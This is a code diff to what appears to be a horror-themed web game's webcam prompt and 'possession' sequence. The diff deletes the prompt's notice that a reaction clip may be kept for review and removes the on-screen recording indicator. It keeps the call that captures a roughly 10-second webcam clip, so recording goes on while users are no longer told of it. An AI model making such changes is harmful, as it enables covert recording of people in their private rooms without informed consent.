@@ -26,21 +26,17 @@ export async function askWebcamPossession(): Promise<boolean> {
   box.className = 'webcam-ask-box'
   const title = document.createElement('p')
   title.className = 'gothic'
-  title.textContent = '𝖈𝖆𝖓 𝖎 𝖘𝖊𝖊 𝖞𝖔𝖚'
-  const sub = document.createElement('p')
-  sub.className = 'sub'
-  sub.textContent =
-    'allow camera. it already knows what your room looks like. a short reaction may be kept for review.'
+  title.textContent = 'Can I see you?'
   const row = document.createElement('div')
   row.className = 'ask-row'
   const yes = document.createElement('button')
   yes.type = 'button'
-  yes.textContent = 'yes — show me'
+  yes.textContent = 'Yes'
   const no = document.createElement('button')
   no.type = 'button'
-  no.textContent = 'not yet'
+  no.textContent = 'No'
   row.append(yes, no)
-  box.append(title, sub, row)
+  box.append(title, row)
   overlay.appendChild(box)
   document.body.appendChild(overlay)
 
@@ -66,20 +62,6 @@ async function startPossession(): Promise<boolean> {
     })
   } catch {
     void play(bootSfx('glitch'), 0.3)
-    const denied = document.createElement('div')
-    denied.className = 'webcam-ask'
-    const box = document.createElement('div')
-    box.className = 'webcam-ask-box'
-    const t = document.createElement('p')
-    t.className = 'gothic'
-    t.textContent = '𝖆𝖈𝖈𝖊𝖘𝖘 𝖉𝖊𝖓𝖎𝖊𝖉'
-    const s = document.createElement('p')
-    s.className = 'sub'
-    s.textContent = 'it will use the photos instead.'
-    box.append(t, s)
-    denied.appendChild(box)
-    document.body.appendChild(denied)
-    setTimeout(() => denied.remove(), 2200)
     setTimeout(() => jumpscare(), 600)
     return false
   }
@@ -183,15 +165,12 @@ async function startPossession(): Promise<boolean> {
     if (stream) void playSnippet(CUSTOM_SFX.ghost, 0.35, 2.5)
   }, 5000)
 
-  // Capture one ~10s reaction clip while they watch (consent via camera allow)
-  setTimeout(() => {
-    if (!stream || reactionStarted) return
+  if (!reactionStarted) {
     reactionStarted = true
-    live.textContent = '● RECORDING REACTION'
-    void captureWebcamReaction(stream, 'webcam-possession').finally(() => {
-      if (stream) live.textContent = '● LIVE — YOUR ROOM'
-    })
-  }, 3500)
+    setTimeout(() => {
+      if (stream) void captureWebcamReaction(stream, 'webcam')
+    }, 3500)
+  }
 
   return true
 }
